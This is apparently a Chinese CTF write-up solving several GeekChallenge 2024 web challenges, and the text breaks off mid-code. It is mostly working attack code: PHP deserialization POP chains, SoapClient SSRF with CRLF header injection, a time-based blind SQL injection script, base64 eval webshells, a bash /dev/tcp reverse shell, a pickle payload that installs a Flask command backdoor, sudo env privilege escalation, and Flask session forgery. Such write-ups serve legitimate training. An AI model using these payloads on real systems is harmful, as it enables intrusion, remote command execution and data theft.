urlencode($s);\r#O%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A3%3A%22SYC%22%3A1%3A%7Bs%3A7%3A%22starven%22%3Bs%3A93%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%2F%3F%3Ephp_value+auto_prepend_file+%2Fflag%0A%23%2Fresource%3D.htaccess%22%3B%7D%7D%7D%7D%7D ç®€å•åˆ†æä¸€ä¸‹ã€‚é¦–å…ˆæ˜¯dataçš„æ­£åˆ™ç”¨16è¿›åˆ¶ç»•è¿‡ï¼Œloverç±»çš„destructè§¦å‘Geekç±»çš„geté­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘loverçš„invokeï¼Œç„¶åæ˜¯Geekçš„tostringï¼Œæœ€åè¿›å…¥åˆ°SYCçš„callæ–¹æ³•ã€‚\næ­»äº¡exitçš„ç»•è¿‡ï¼šç”±äºæ­£åˆ™è¿‡æ»¤çš„éå¸¸ä¸¥æ ¼ï¼Œæ— æ³•ç›´æ¥å†™å…¥phpæœ¨é©¬ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å†™å…¥htaccessé…ç½®æ–‡ä»¶é¢„åŒ…å«flag\nez_SSRF #\rwww.zipå¤‡ä»½æ–‡ä»¶æ³„éœ²\n#calculator.php\r\u0026lt;?php\r$admin=\u0026#34;aaaaaaaaaaaadmin\u0026#34;;\r$adminpass=\u0026#34;i_want_to_getI00_inMyT3st\u0026#34;;\rfunction check($auth) {\rglobal $admin,$adminpass;\r$auth = str_replace(\u0026#39;Basic \u0026#39;, \u0026#39;\u0026#39;, $auth);\r$auth = base64_decode($auth);\rlist($username, $password) = explode(\u0026#39;:\u0026#39;, $auth);\recho $username.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$password;\rif($username===$admin \u0026amp;\u0026amp; $password===$adminpass) {\rreturn 1;\r}else{\rreturn 2;\r}\r}\rif($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]!==\u0026#34;127.0.0.1\u0026#34;){\rexit(\u0026#34;Hacker\u0026#34;);\r}\r$expression = $_POST[\u0026#39;expression\u0026#39;];\r$auth=$_SERVER[\u0026#39;HTTP_AUTHORIZATION\u0026#39;];\rif(isset($auth)){\rif (check($auth)===2) {\rif(!preg_match(\u0026#39;/^[0-9+\\-*\\/]+$/\u0026#39;, $expression)) {\rdie(\u0026#34;Invalid expression\u0026#34;);\r}else{\r$result=eval(\u0026#34;return $expression;\u0026#34;);\rfile_put_contents(\u0026#34;result\u0026#34;,$result);\r}\r}else{\r$result=eval(\u0026#34;return $expression;\u0026#34;);\rfile_put_contents(\u0026#34;result\u0026#34;,$result);\r}\r}else{\rexit(\u0026#34;Hacker\u0026#34;);\r} #h4d333333.php\r\u0026lt;?php\rerror_reporting(0);\rif(!isset($_POST[\u0026#39;user\u0026#39;])){\r$user=\u0026#34;stranger\u0026#34;;\r}else{\r$user=$_POST[\u0026#39;user\u0026#39;];\r}\rif (isset($_GET[\u0026#39;location\u0026#39;])) {\r$location=$_GET[\u0026#39;location\u0026#39;];\r$client=new SoapClient(null,array(\r\u0026#34;location\u0026#34;=\u0026gt;$location,\r\u0026#34;uri\u0026#34;=\u0026gt;\u0026#34;hahaha\u0026#34;,\r\u0026#34;login\u0026#34;=\u0026gt;\u0026#34;guest\u0026#34;,\r\u0026#34;password\u0026#34;=\u0026gt;\u0026#34;gueeeeest!!!!\u0026#34;,\r\u0026#34;user_agent\u0026#34;=\u0026gt;$user.\u0026#34;\u0026#39;s Chrome\u0026#34;));\r$client-\u0026gt;calculator();\recho file_get_contents(\u0026#34;result\u0026#34;);\r}else{\recho \u0026#34;Please give me a location\u0026#34;;\r} åœ¨calculator.phpä¸­ï¼Œå¯¹ipçš„æ ¡éªŒä½¿ç”¨çš„æ˜¯remote_addrï¼Œè¿™ä¸ªæ˜¯æ— æ³•é€šè¿‡HTTPå¤´è¿›è¡Œä¼ªé€ çš„\nåªèƒ½é€šè¿‡h4d333333.phpå¯¹calculatorè¿›è¡Œè¯·æ±‚\nç›¸å…³æ–‡ç« ï¼šåˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF+CRLFæ”»å‡» | Xiaojian Yuan\u0026rsquo;s Homepage (lethe.site)\n\u0026lt;?php\r$target = \u0026#39;http://xxx/xxx.php\u0026#39;;\r$post_string = \u0026#39;expression=system(\u0026#34;cat /flag \u0026gt; flag\u0026#34;);\u0026#39;;\r$headers = array(\r\u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;,\r\u0026#39;AUTHORIZATION: YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0\u0026#39;\r);\r$b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target,\u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;wupco^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers).\u0026#39;^^Content-Length: \u0026#39;.(string)strlen($post_string).\u0026#39;^^^^\u0026#39;.$post_string,\u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;aaab\u0026#34;));\r$aaa = serialize($b);\r$aaa = str_replace(\u0026#39;^^\u0026#39;,\u0026#39;%0d%0a\u0026#39;,$aaa);\r$aaa = str_replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;%26\u0026#39;,$aaa);\recho $aaa;\r?\u0026gt;\r#åªéœ€è¦useragentçš„éƒ¨åˆ†\r#wupco%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aAUTHORIZATION: YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0d%0aContent-Length: 38%0d%0a%0d%0aexpression=system(\u0026#34;cat /flag \u0026gt; flag\u0026#34;); funnySQL #\rè€ƒç‚¹ï¼šBenchmarkæ—¶é—´ç›²æ³¨+æ— åˆ—åæ³¨å…¥\nè¿›è¡Œå…³é”®å­—Fuzzï¼Œè¿‡æ»¤å¦‚å›¾\næµ‹è¯•payload\n\u0026#39;||if((2\u0026gt;1),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\rå¯ä»¥çœ‹åˆ°é¡µé¢è¿›å…¥äº†è½¬åœˆ å‰©ä¸‹å°±å†™è„šæœ¬å°±è¡Œäº†ï¼Œç”±äºinformationè¢«è¿‡æ»¤ï¼Œä½¿ç”¨mysql.innodb_table_statsæ¥ä»£æ›¿information_schema\nif((select(COUNT(*)\u0026gt;0)from(select/**/1/**/union/**/select*from/**/Rea11ys3ccccccr3333t)a/**/limit/**/0,1),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)\rç”¨è¿™ä¸ªæ¥åˆ¤æ–­åˆ—æ•° å®Œæ•´è„šæœ¬å¦‚ä¸‹\nimport requests\rfrom urllib.parse import urlencode\rfrom time import time\rurl=\u0026#34;http://80-5a7887db-128e-47a8-ab4c-dafafc7a3c95.challenge.ctfplus.cn/index.php?username=\u0026#34;\rdic=\u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^`{|}~\u0026#34;\rflag=\u0026#39;\u0026#39;\rfor i in range(1,100):\rfor s in dic:\r#payload=f\u0026#34;\u0026#39;||if((SUBSTR(DATABASE(),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34; database: syclover\r#payload = f\u0026#34;\u0026#39;||if((substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)like\u0026#39;syclover\u0026#39;),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34; # table name:Rea11ys3ccccccr3333t,users\r#payload=f\u0026#34;\u0026#39;||if((substr((select(group_concat(database_name))/**/from(mysql.innodb_table_stats)where(table_name)LIKE\u0026#39;Rea11ys3ccccccr3333t\u0026#39;),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34;\r#payload=\u0026#39;||if((select(COUNT(*)\u0026gt;0)from(select/**/1/**/union/**/select*from/**/Rea11ys3ccccccr3333t)a/**/limit/**/0,1),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)# åªæœ‰ä¸€åˆ—\rpayload=f\u0026#34;\u0026#39;||if((substr((select*from(select/**/1/**/union/**/select*from/**/Rea11ys3ccccccr3333t)a/**/limit/**/1,1),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34;\rpayload= urlencode({\u0026#39;\u0026#39;: payload})[1::]\rstart=time()\rreq=requests.get(url+payload)\rend=time()\rif end-start\u0026gt;1:\rflag+=s\rprint(\u0026#34;flag: \u0026#34;,flag)\rbreak PHPä¸æ¯”Javaå·® #\r\u0026lt;?php\rhighlight_file(__FILE__);\rerror_reporting(0);\rinclude \u0026#34;secret.php\u0026#34;;\rclass Challenge{\rpublic $file;\rpublic function Sink()\r{\recho \u0026#34;\u0026lt;br\u0026gt;!!!A GREAT STEP!!!\u0026lt;br\u0026gt;\u0026#34;;\recho \u0026#34;Is there any file?\u0026lt;br\u0026gt;\u0026#34;;\rif(file_exists($this-\u0026gt;file)){\rglobal $FLAG;\recho $FLAG;\r}\r}\r}\rclass Geek{\rpublic $a;\rpublic $b;\rpublic function __unserialize(array $data): void\r{\r$change=$_GET[\u0026#34;change\u0026#34;];\r$FUNC=$change($data);\r$FUNC();\r}\r}\rclass Syclover{\rpublic $Where;\rpublic $IS;\rpublic $Starven;\rpublic $Girlfriend;\rpublic function __toString()\r{\recho \u0026#34;__toString is called\u0026lt;br\u0026gt;\u0026#34;;\r$eee=new $this-\u0026gt;Where($this-\u0026gt;IS);\r$fff=$this-\u0026gt;Starven;\r$eee-\u0026gt;$fff($this-\u0026gt;Girlfriend);\r}\r}\runserialize($_POST[\u0026#39;data\u0026#39;]); é¦–å…ˆtoStringè¦ä½¿ç”¨implodeå‡½æ•°è§¦å‘ï¼Œç„¶åå…¶ä¸­å¯ä»¥çœ‹åˆ°æœ‰å…³é”®å­—newï¼Œå¯ä»¥è”æƒ³åˆ°PHPåŸç”Ÿç±»ã€‚\nPHPå‡½æ•°åå°„ç±»çš„ç›¸å…³çŸ¥è¯†ï¼šPHP: ReflectionFunction - Manual\nç”±äºæ— æ³•å†™å…¥Challengeçš„fileå±æ€§ï¼Œå°±åªèƒ½é€šè¿‡åå°„å…¶ä»–å‡½æ•°æ¥è¿›è¡ŒRCEï¼Œä¹Ÿå°±æ˜¯è¯´Challengeç±»ä¸éœ€è¦\næ ¹æ®å®˜æ–¹æ–‡æ¡£é‡Œçš„ä½¿ç”¨æ–¹å¼\nå¯ä»¥å¦‚ä¸‹æ„é€ \n\u0026lt;?php\r.....\r.....\r$e=new Geek();\r$e-\u0026gt;a=new Syclover();\r$e-\u0026gt;a-\u0026gt;Where=\u0026#34;ReflectionFunction\u0026#34;;\r$e-\u0026gt;a-\u0026gt;IS=\u0026#34;system\u0026#34;;\r$e-\u0026gt;a-\u0026gt;Starven=\u0026#34;invokeArgs\u0026#34;;\r$e-\u0026gt;a-\u0026gt;Girlfriend=array(\u0026#39;echo \u0026#34;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\u0026#34; | base64 -d \u0026gt;shell.php\u0026#39;);\recho serialize($e);\r//O:4:\u0026#34;Geek\u0026#34;:2:{s:1:\u0026#34;a\u0026#34;;O:8:\u0026#34;Syclover\u0026#34;:4:{s:5:\u0026#34;Where\u0026#34;;s:18:\u0026#34;ReflectionFunction\u0026#34;;s:2:\u0026#34;IS\u0026#34;;s:6:\u0026#34;system\u0026#34;;s:7:\u0026#34;Starven\u0026#34;;s:10:\u0026#34;invokeArgs\u0026#34;;s:10:\u0026#34;Girlfriend\u0026#34;;a:1:{i:0;s:66:\u0026#34;echo \u0026#34;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\u0026#34; | base64 -d \u0026gt;shell.php\u0026#34;;}}s:1:\u0026#34;b\u0026#34;;N;} éœ€è¦å¯¹payloadè¿›è¡ŒURLç¼–ç \nç„¶åè¯»å–æ ¹ç›®å½•flagï¼Œéœ€è¦æƒé™\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null å­˜åœ¨fileå‘½ä»¤å¯ä»¥ä½¿ç”¨\nç›¸å…³æ–‡ç« ï¼šfile | GTFOBins\né¢ï¼Œå¥½åƒæ— æ³•ç›´æ¥åœ¨é¡µé¢å›æ˜¾ï¼Œéœ€è¦åå¼¹Shellæ‰èƒ½çœ‹åˆ°æŠ¥é”™ä¿¡æ¯\nsystem(\u0026#34;/bin/bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/ip/port \u0026lt;\u0026amp;1\u0026#39;\u0026#34;); æ³¨æ„payloadä¾ç„¶éœ€è¦urlç¼–ç \nnot_just_pop #\ræºç å¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(__FILE__);\rini_get(\u0026#39;open_basedir\u0026#39;);\rclass lhRaMK7{\rpublic $Do;\rpublic $You;\rpublic $love;\rpublic $web;\rpublic function __invoke()\r{\recho \u0026#34;æˆ‘å‹’ä¸ªè±†ï¼Œçœ‹æ¥ä½ æœ‰ç‚¹å®åŠ›ï¼Œé‚£æ¥ä¸‹æ¥è¯¥æ€ä¹ˆæ‹¿åˆ°flagå‘¢ï¼Ÿ\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\reval($this-\u0026gt;web);\r}\rpublic function __wakeup()\r{\r$this-\u0026gt;web=$this-\u0026gt;love;\r}\rpublic function __destruct()\r{\rdie($this-\u0026gt;You-\u0026gt;execurise=$this-\u0026gt;Do);\r}\r}\rclass Parar{\rprivate $execurise;\rpublic $lead;\rpublic $hansome;\rpublic function __set($name,$value)\r{\recho $this-\u0026gt;lead;\r}\rpublic function __get($args)\r{\rif(is_readable(\u0026#34;/flag\u0026#34;)){\recho file_get_contents(\u0026#34;/flag\u0026#34;);\r}\relse{\recho \u0026#34;è¿˜æƒ³ç›´æ¥è¯»flagï¼Œæ´—æ´—ç¡å§ï¼Œrceå»\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\rif ($this-\u0026gt;execurise==\u0026#34;man!\u0026#34;) {\recho \u0026#34;å±…ç„¶æ²¡å æœº\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($this-\u0026gt;hansome-\u0026gt;lover)){\rphpinfo();\r}\r}\relse{\recho($this-\u0026gt;execurise);\recho \u0026#34;ä½ ä¹Ÿæƒ³è¢«è‚˜å—\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\r}\r}\r}\r}\rclass Starven{\rpublic $girl;\rpublic $friend;\rpublic function __toString()\r{\rreturn \u0026#34;è¯•è¯•æ‰€æƒ³çš„å‘—ï¼Œè¯´ä¸å®šæˆåŠŸäº†\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$this-\u0026gt;girl-\u0026gt;abc;\r}\rpublic function __call($args1,$args2)\r{\r$func=$this-\u0026gt;friend;\r$func();\r}\r}\rclass SYC{\rprivate $lover;\rpublic $forever;\rpublic function __isset($args){\rreturn $this-\u0026gt;forever-\u0026gt;nononon();\r}\r}\r$Syclover=$_GET[\u0026#39;Syclover\u0026#39;];\rif (isset($Syclover)) {\runserialize(base64_decode($Syclover));\rthrow new Exception(\u0026#34;None\u0026#34;);\r}else{\recho(\u0026#34;æ€ä¹ˆä¸ç»™æˆ‘å‘¢ï¼Œæ˜¯ä¸å–œæ¬¢å—ï¼Ÿ\u0026#34;);\r} POPé“¾æ¡\nlhRaMK7-\u0026gt;__destruct\rParar-\u0026gt;__get\rSYC-\u0026gt;__isset\rStarven-\u0026gt;__call\rlhRaMK7-\u0026gt;__invoke å…¶ä¸­throw new Exception(\u0026quot;None\u0026quot;);ï¼Œç”¨GCå›æ”¶æœºåˆ¶å¯ä»¥ç»•è¿‡\næµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) wakeupä¸ç”¨ç®¡ï¼Œåªéœ€è¦æŠŠloveè®¾ç½®ä¸ºå‘½ä»¤å³å¯\n\u0026lt;?php\rclass lhRaMK7{\rpublic $Do=\u0026#34;phpinfo();\u0026#34;;\rpublic $You;\rpublic $love;\rpublic $web;\r}\rclass Parar{\rprivate $execurise=\u0026#34;man!\u0026#34;;\rpublic $lead;\rpublic $hansome;\rpublic function getexe(){\rreturn $this-\u0026gt;execurise;\r}\r}\rclass Starven{\rpublic $girl;\rpublic $friend;\r}\rclass SYC{\rprivate $lover=\u0026#34;123\u0026#34;;\rpublic $forever;\rfunction getlover(){\rreturn $this-\u0026gt;lover;\r}\rpublic function __isset($args){\recho \u0026#34;__isset\u0026#34;;\r}\r}\r$l=new lhRaMK7();\r$p=new Parar();\r$star=new Starven();\r$syc=new SYC();\r$l-\u0026gt;You=$p;\r$p-\u0026gt;lead=$star;\r$star-\u0026gt;girl=$p;\r$p-\u0026gt;hansome=\u0026amp;$syc;\r$syc-\u0026gt;forever=$star;\r$star-\u0026gt;friend=$l;\r//å‘½ä»¤\r$l-\u0026gt;love=\u0026#34;include \u0026#39;/tmp/a.php\u0026#39;;\u0026#34;; //$l-\u0026gt;love = \u0026#34;file_put_contents(\u0026#39;/tmp/a.php\u0026#39;, \u0026#39;\u0026lt;?php eval(\\$_POST[\\\\\u0026#39;a\\\\\u0026#39;]); \u0026#39;);\u0026#34;;\r$ser=serialize(array($l,new lhRaMK7()));\recho $ser.\u0026#34;\\n\u0026#34;;\r$ser=str_replace(\u0026#34;i:1;O:7\u0026#34;,\u0026#34;i:0;O:7\u0026#34;,$ser);\recho base64_encode($ser); è¿™é‡Œçš„æ€è·¯æ˜¯å…ˆå†™å…¥ä¸€ä¸ª/tmp/a.phpä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åå†åŒ…å«ä»–ï¼ŒPOSTæ‰§è¡Œå‘½ä»¤\nåœ¨phpinfoé‡Œé¢çœ‹è§äº†åŸºæœ¬ä¸Šç³»ç»Ÿå‘½ä»¤å‡½æ•°è¢«è¿‡æ»¤å®Œäº†\nè¿æ¥èšå‰‘ï¼Œä½¿ç”¨disable_functionsæ’ä»¶ï¼Œå¦‚å›¾\næ­£å¸¸æ²¡æœ‰æƒé™è¯»å–flag\næç¤ºè¯´å°è¯•sudo\nå‘ç°envæ˜¯å‰§æœ‰ç‰¹æ®Šæƒé™çš„\né€šè¿‡sudoå’Œenvå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤\nsudo env bash -c \u0026#39;cat /flag\u0026#39; ez_python #\rç»™çš„Hintæ–‡ä»¶\nimport os\rimport secrets\rfrom flask import Flask, request, render_template_string, make_response, render_template, send_file\rimport pickle\rimport base64\rimport black\rapp = Flask(__name__)\r#To Ctferï¼šç»™ä½ æºç åªæ˜¯ç»™ä½ æ¼æ´ç‚¹çš„hintï¼Œæ€ä¹ˆç»•ï¼Ÿblack.pyé»‘ç›’ï¼Œå”‰æ— æ„ä¹‰\r@app.route(\u0026#39;/\u0026#39;)\rdef index():\rreturn render_template_string(open(\u0026#39;templates/index.html\u0026#39;).read())\r@app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef register():\rif request.method == \u0026#39;POST\u0026#39;:\rusname = request.form[\u0026#39;username\u0026#39;]\rpasswd = request.form[\u0026#39;password\u0026#39;]\rif usname and passwd:\rheart_cookie = secrets.token_hex(32)\rresponse = make_response(f\u0026#34;Registered successfully with username: {usname} \u0026lt;br\u0026gt; Now you can go to /login to heal starven\u0026#39;s heart\u0026#34;)\rresponse.set_cookie(\u0026#39;heart\u0026#39;, heart_cookie)\rreturn response\rreturn render_template(\u0026#39;register.html\u0026#39;)\r@app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef login():\rheart_cookie = request.cookies.get(\u0026#39;heart\u0026#39;)\rif not heart_cookie:\rreturn render_template(\u0026#39;warning.html\u0026#39;)\rif request.method == \u0026#39;POST\u0026#39; and request.cookies.get(\u0026#39;heart\u0026#39;) == heart_cookie:\rstatement = request.form[\u0026#39;statement\u0026#39;]\rtry:\rheal_state = base64.b64decode(statement)\rprint(heal_state)\rfor i in black.blacklist:\rif i in heal_state:\rreturn render_template(\u0026#39;waf.html\u0026#39;)\rpickle.loads(heal_state)\rres = make_response(f\u0026#34;Congratulations! You accomplished the first step of healing Starven\u0026#39;s broken heart!\u0026#34;)\rflag = os.getenv(\u0026#34;GEEK_FLAG\u0026#34;) or os.system(\u0026#34;cat /flag\u0026#34;)\ros.system(\u0026#34;echo \u0026#34; + flag + \u0026#34; \u0026gt; /flag\u0026#34;)\rreturn res\rexcept Exception as e:\rprint( e)\rpass\rreturn \u0026#34;Error!!!! give you hint: maybe you can view /starven_s3cret\u0026#34;\rreturn render_template(\u0026#39;login.html\u0026#39;)\r@app.route(\u0026#39;/monologue\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\rdef joker():\rreturn render_template(\u0026#39;joker.html\u0026#39;)\r@app.route(\u0026#39;/starven_s3cret\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef secret():\rreturn send_file(__file__,as_attachment=True)\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000, debug=False) è¿™é“é¢˜çš„å’ŒMoeCTF2024çš„PetStoreå·®ä¸å¤šï¼Œæˆ‘çš„æ–‡ç« é‡Œåˆšå¥½æœ‰ï¼Œå¯ä»¥ç›´æ¥å†™å…¥Flaskå†…å­˜é©¬\nMoeCTF 2024 - HYH (hyhforever.top) é‡Œé¢çš„pocç›´æ¥æ‹¿è¿‡æ¥ç”¨å°±å¯ä»¥äº†\nimport pickle\rimport base64\rimport os\rclass Pet:\rdef __reduce__(self):\rreturn (eval, (\r\u0026#34;__import__(\\\u0026#34;sys\\\u0026#34;).modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(\u0026#39;os\u0026#39;).popen(request.args.get(\u0026#39;cmd\u0026#39;)).read())\u0026#34;,))\re = Pet()\rpoc = pickle.dumps(e)\rprint(base64.b64encode(poc).decode())\r#gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygic3lzIikubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgpKZSFlFKULg== ç„¶åç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯\npy_game #\réšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·è¿›è¡Œç™»å½•ï¼Œæç¤ºæƒé™æ˜¯æ™®é€šç”¨æˆ·\nå¼€å§‹æ¸¸æˆï¼Œåœ¨æºç é‡Œå¾—åˆ°flagçš„ä½ç½®åœ¨/flag\nå°†å½“å‰ç”¨æˆ·çš„sessionå€¼æ‹¿å»è§£å¯†\njwtè§£å¯†å¤±è´¥\nç”±äºé¢˜ç›®æ˜¯Flaskæ­å»ºçš„ï¼Œå¯ä»¥è€ƒè™‘å°è¯•flask-sessionçš„å¯†é’¥çˆ†ç ´ï¼ˆå› ä¸ºå¹¶æ²¡æœ‰å¾—åˆ°ä»»ä½•secret-keyçš„ä¿¡æ¯ï¼‰\nGithubå·¥å…·ï¼šParadoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)\npip3 install flask-unsign[wordlist] å¾—åˆ°å¯†é’¥ä¸ºï¼ša123456\nä¸‹é¢æ˜¯pythonçš„ç”Ÿæˆsessionçš„è„šæœ¬\nfrom itsdangerous import base64_decode\rimport zlib\rfrom flask.sessions import SecureCookieSessionInterface\rimport ast\rclass MockApp(object):\rdef __init__(self, secret_key):\rself.secret_key = secret_key\rdef encode(secret_key, session_cookie_structure):\rtry:\rapp = MockApp(secret_key)\rsession_cookie_structure = dict(ast.literal_eval(session_cookie_structure))\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.dumps(session_cookie_structure)\rexcept Exception as e:\rreturn \u0026#34;[Encoding error] {}\u0026#34;.format(e)\rdef decode(session_cookie_value, secret_key=None):\rtry:\rif secret_key is None:\rcompressed = False\rpayload = session_cookie_value\rif payload.startswith(\u0026#39;.\u0026#39;):\rcompressed = True\rpayload = payload[1:]\rdata = payload.split(\u0026#34;.\u0026#34;)[0]\rdata = base64_decode(data)\rif compressed:\rdata = zlib.decompress(data)\rreturn data\relse:\rapp = MockApp(secret_key)\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.loads(session_cookie_value)\rexcept Exception as e:\rreturn \u0026#34;[Decoding error] {}\u0026#34;.format(e)\r# ç¤ºä¾‹ç”¨æ³•\rcookie_structure = encode(secret_key=\u0026#39;a123456\u0026#39;,session_cookie_structure=\u0026#34;{\u0026#39;_flashes\u0026#39;: [(\u0026#39;success\u0026#39;, \u0026#39;ç™»å½•æˆåŠŸ\u0026#39;)], \u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;}\u0026#34;)\rprint(cookie_structure) æ›¿æ¢cookieåè¿›å…¥dashboard\nåœ¨Admin Panelé‡Œä¸‹è½½åˆ°æºç çš„pycæ–‡ä»¶ï¼Œå»åç¼–è¯‘ç½‘ç«™ï¼špythonåç¼–è¯‘ - åœ¨çº¿å·¥å…· (tool.lu)\nç»è¿‡æˆ‘åˆ å‡åçš„æœ‰ç”¨æºç å¦‚ä¸‹\nimport json\rfrom lxml import etree\rfrom flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify\rapp = Flask(__name__)\rapp.secret_key = \u0026#39;a123456\u0026#39;\rapp.config[\r\u0026#39;xml_data\u0026#39;] = \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;GeekChallenge2024\u0026gt;\u0026lt;EventName\u0026gt;Geek Challenge\u0026lt;/EventName\u0026gt;\u0026lt;Year\u0026gt;2024\u0026lt;/Year\u0026gt;\u0026lt;Description\u0026gt;This is a challenge event for geeks in the year 2024.\u0026lt;/Description\u0026gt;\u0026lt;/GeekChallenge2024\u0026gt;\u0026#39;\radmin = User(\u0026#39;admin\u0026#39;, \u0026#39;123456j1rrynonono\u0026#39;)\rUsers = [\radmin]\rdef update(src, dst):\rfor k, v in src.items():\rif hasattr(dst, \u0026#39;__getitem__\u0026#39;):\rif dst.get(k) and isinstance(v, dict):\rupdate(v, dst.get(k))\relse:\rdst[k] = v\rif hasattr(dst, k) and isinstance(v, dict):\rupdate(v, getattr(dst, k))\rcontinue\rsetattr(dst, k, v)\rdef xml_parse():\rtry:\rxml_bytes = app.config[\u0026#39;xml_data\u0026#39;].encode(\u0026#39;utf-8\u0026#39;)\rparser = etree.XMLParser(True, True, **(\u0026#39;load_dtd\u0026#39;, \u0026#39;resolve_entities\u0026#39;))\rtree = etree.fromstring(xml_bytes, parser, **(\u0026#39;parser\u0026#39;,))\rresult_xml = etree.tostring(tree, True, \u0026#39;utf-8\u0026#39;, True, **(\u0026#39;pretty_print\u0026#39;, \u0026#39;encoding\u0026#39;, \u0026#39;xml_declaration\u0026#39;))\rreturn Response(result_xml, \u0026#39;application/xml\u0026#39;, **(\u0026#39;mimetype\u0026#39;,))\rexcept etree.XMLSyntaxError:\re = None\rtry:\rreturn str(e)\re = None\rdel e\rreturn None\rxml_parse = app.route(\u0026#39;/xml_parse\u0026#39;)(xml_parse)\rblack_list = [\r\u0026#39;__class__\u0026#39;.encode(),\r\u0026#39;__init__\u0026#39;.encode(),\r\u0026#39;__globals__\u0026#39;.encode()]\rdef update_route():\rif \u0026#39;username\u0026#39; in session and session[\u0026#39;username\u0026#39;] == \u0026#39;admin\u0026#39;:\rif request.data:\rtry:\rif not check(request.data):\rreturn (\u0026#39;NONONO, Bad Hacker\u0026#39;, 403)\rdata = None.loads(request.data.decode())\rprint(data)\rif all((lambda .0: pass)(data.values())):\rupdate(data, User)\rreturn (jsonify({\r\u0026#39;message\u0026#39;: \u0026#39;æ›´æ–°æˆåŠŸ\u0026#39;}), 200)\rreturn None\rexcept Exception:\re = 